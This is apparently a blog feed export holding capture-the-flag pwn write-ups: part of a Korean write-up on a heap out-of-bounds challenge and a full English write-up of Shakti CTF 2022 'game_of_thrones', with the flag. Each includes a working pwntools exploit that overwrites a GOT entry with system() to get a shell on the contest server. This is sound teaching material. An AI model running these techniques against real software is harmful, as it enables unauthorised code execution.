이용해서 패치해주고 문제풀이를 하였다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux-vdso.so.1 (0x00007ffc78b1f000)</span><br><span class="line">./libc.so.6 (0x00007f8d6e200000)</span><br><span class="line">./ld.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f8d6e69d000)</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">=======================</span><br><span class="line"> | Welcome Phrack 66 |</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">Here&#x27;s a generous leak for you! 0x7fc34a06dba0</span><br><span class="line"></span><br><span class="line">Here&#x27;s one more generous leak for you: 0x961220</span><br><span class="line"></span><br><span class="line">MENU</span><br><span class="line"></span><br><span class="line">1. malloc 0/4</span><br><span class="line">2. edit</span><br><span class="line">3. target</span><br><span class="line">4. quit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>원하는 사이즈만큼 힙에 데이터를 할당 가능하고.. 원하는 인덱스(?)에 내용을 수정 가능하다.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter index: &quot;</span>);</span><br><span class="line">  v5 = getint(<span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No negative indices allowed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;maximum requests reached!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !m_array[v5] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Index not allocated!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;data: &quot;</span>);</span><br><span class="line">  get_inp(m_array[v5], (<span class="type">unsigned</span> <span class="type">int</span>)(size + <span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>인덱스를 입력받지만 정작 검증하는 인덱스는 엉뚱한 값이라서 oob가 발생한다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>출력해주는 값을 통해 립시 베이스랑 힙 주소를 자연스럽게 알 수 있다.<br>1번 메뉴를 이용하여 힙을 할당한 다음 malloc got를 적어놓고 oob가 발생하니 malloc got가 써진 주소에 접근해서 2번 메뉴를 이용하여 malloc got를 system 주소로 덮을 수 있다.<br>그리고 다시 1번 메뉴를 이용하면 system으로 덮혀진 malloc이 실행될텐데 이때 인자를 우리의 입력값으로 조절할 수 있다. &#x2F;bin&#x2F;sh를 보내주면 성공.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">30930</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc.address = leak - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">heap = heap + <span class="number">0x10e0</span></span><br><span class="line">idx = (heap-<span class="number">0x4040c0</span>)//<span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(idx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc , malloc_got</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>, p64(<span class="number">0x404048</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc_got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;data:&#x27;</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>너무 늦게 롸업을 작성한다 ㅎ.. 개인적으로 문제 코드에 malloc이 나오면 긴장하는 편인데 바로 취약점을 찾고 생각보다 빠르게 익스했던 기억이 난다.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shakti CTF 2022 - game_of_thrones (medium)</title>
      <link href="/221214-shaktictf2022-game_of_thrones/"/>
      <url>/221214-shaktictf2022-game_of_thrones/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(10&#x2F;387) solves</p><p>MediumT</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>Help capture king’s landing and defeat the night walkers and his army of the dead!<br>Note: The server is running on Ubuntu 20.04.<br>Author: d1g174l_f0rtr355</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c</span><br><span class="line">└── libc.so.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chall_dd0d7c74-c5fb-41f8-850f-2f82d6b6495c: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /glibc/2.27/64/lib/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d246cab5927d94da0823f90a45d0373f433066ab, not stripped</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  initialize(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\n=================================================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;|\tWelcome to Game of Thrones (GOT)\t|&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=================================================\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The goal is simple! You need to become the ruler of the seven kingdoms!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      v3 = getchar();</span><br><span class="line">      getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      white_walkers(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="string">&#x27;3&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      exit_function(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      num_dragons = use_dragons();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      kings_landing(&amp;num_men, &amp;num_dragons);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The main function has a 3 functions to keep an eye on.</p><ol><li>num_dragons &#x3D; use_dragons();</li><li>kings_landing(&amp;num_men, &amp;num_dragons);</li><li>white_walkers(&amp;num_men, &amp;num_dragons);</li></ol><p>Let’s take a look at each one.</p><h4 id="1-use-dragons"><a href="#1-use-dragons" class="headerlink" title="1. use_dragons()"></a>1. <code>use_dragons()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nSay something in Valyrian: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The dragons say: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// fsb</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this function, format variable receives 10 characters from player and outputs them as they are. Since <code>printf()</code> doesn’t specify a format string when printing, the <strong>Format String Bug(FSB)</strong> possibility exists.</p><p>The return value 3 is stored in <code>num_dragons</code> that global variable.</p><h4 id="2-kings-landing-amp-num-men-amp-num-dragons"><a href="#2-kings-landing-amp-num-men-amp-num-dragons" class="headerlink" title="2. kings_landing(&amp;num_men, &amp;num_dragons)"></a>2. <code>kings_landing(&amp;num_men, &amp;num_dragons)</code></h4><p>In this funciton, the main parts of the functon are as follows.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="string">&#x27;2&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *num_dragons &amp;&amp; *num_dragons &lt;= <span class="number">3u</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;How many dragons would you like to use ?\n&gt; &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;use_dragons);</span><br><span class="line">      <span class="keyword">if</span> ( use_dragons &amp;&amp; use_dragons &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *num_dragons -= use_dragons;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;</span>, use_dragons);</span><br><span class="line">        getchar();</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%50[^\n]s&quot;</span>, format);</span><br><span class="line">        <span class="built_in">printf</span>(format);                         <span class="comment">// fsb</span></span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You only use dragons that you have&quot;</span>);</span><br><span class="line">        exit_function(<span class="number">0LL</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>We can use the 3 dragons. It means we have the <strong>3 chances with FSB</strong> in this function. However, the <code>use_dragons()</code> must precede this function.</p><h4 id="3-white-walkers-amp-num-men-amp-num-dragons"><a href="#3-white-walkers-amp-num-men-amp-num-dragons" class="headerlink" title="3. white_walkers(&amp;num_men, &amp;num_dragons)"></a>3. <code>white_walkers(&amp;num_men, &amp;num_dragons)</code></h4><p>There is no meaningful code to find vulnerablilties.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>In <code>use_dragons()</code> function, There is 1 FSB.<br>In <code>kings_landing()</code> function, There are 3 chances with FSB.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>The exploit progressed relatively quickly in the local environment, but took a long time in the remote envireonment. I guess it’s because of libc version.</p><p>(It may be my mistake that I downloaded the wrong libc from CTF web site..)</p><p>Even though libc was given, this version doesn’t seem to match from remote environment, so I guessed the offset. Except for the offset, the exploit is same as in the local environment. <strong>So the offest is dirty because it was obtained by guessing.</strong></p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><p>We have to leak the base address of the binary and libc using <strong>FSB that in <code>use_dragons()</code></strong>. After getting the bases, we know the address of ‘printf()’ in binary and <code>system()</code> in libc. So we can overwriting <code>system()</code> to <code>printf@got</code>. In this case, it uses <strong>the FSB triggered by the <code>kings_landing()</code></strong>. </p><p>I use the <code>fmtstr_payload</code> in pwntools for comfortable. The FSB payload has a 50 length limit, so I use the <code>write_size</code> argument and only 4 bytes of the <code>system()</code> for overwriting.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br></pre></td></tr></table></figure><p>After overwriting, When the <code>printf()</code> is executed, the <code>system()</code> will be executed. We need to focus on the <code>printf()</code> that has only one argument. That argument is our input. It means that we have to find <code>pirntf(input);</code> same as <code>system(input);</code>. </p><p>It is not implemented in the exploit code, but after interactive we can execute the <code>use_dragons()</code> and sent the <code>sh</code> string to the part that receives the input values.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">use_dragons</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%10s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format); <span class="comment">// system(format);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You may be wondering if it’s okay to pass invalid arguments to the <code>system()</code>. For example as below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);</span></span><br><span class="line">system(<span class="string">&quot;\n\nYou currently have %d number of dragons.\n&quot;</span>, <span class="number">3LL</span>);</span><br></pre></td></tr></table></figure><p>It just prints an error saying it can’t run but the binary isn’t exit.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: line 1: ff: command not found</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;65.2.136.80&#x27;</span>, <span class="number">32261</span>)</span><br><span class="line">    <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">use_dragons</span>(<span class="params">fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;an:&#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">kings_landing</span>(<span class="params">use, fmt</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;ns\n\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="built_in">str</span>(use))</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, fmt)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">white_walkers</span>():</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak</span></span><br><span class="line">    use_dragons(<span class="string">&#x27;%17$p%39$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    libc.address = leak-<span class="number">0x80</span>-<span class="number">0x23800</span>-<span class="number">0x800</span>-<span class="number">3</span></span><br><span class="line">    <span class="comment"># libc.address = leak - 0x851f0</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">    e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">    info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># printf got -&gt; system</span></span><br><span class="line">    system = libc.address + <span class="number">0x55410</span>+<span class="number">0x100</span>-<span class="number">0x3180</span>-<span class="number">0x100</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">10</span>, &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(system)[:<span class="number">4</span>] &#125;, write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">    <span class="comment"># if len(payload) &gt; 50:</span></span><br><span class="line">        <span class="comment"># p.close()</span></span><br><span class="line">        <span class="comment"># continue</span></span><br><span class="line">    <span class="comment"># print(len(payload))</span></span><br><span class="line">    kings_landing(<span class="number">1</span> ,payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd</span></span><br><span class="line"><span class="comment"># In sue_dragons() function,</span></span><br><span class="line"><span class="comment"># system(&#x27;sh&#x27;);</span></span><br></pre></td></tr></table></figure><p>I used loop bescause of offset prediction and FSB payload length.</p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shaktictf&#123;F0rm4T_S7r1ng5_4nd_G0T_0v3Rwr17e_4r3_7h3_r34l_k1ll3rs_4d9ddd93416dd1881ae5a725a2cb0058&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Shakti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>InfoSec CTF 2022 - Secure PassStoreV2</title>
      <link href="/221207-infosecctf2022-secure_passstorev2/"/>
      <url>/221207-infosecctf2022-secure_passstorev2/</url>
      
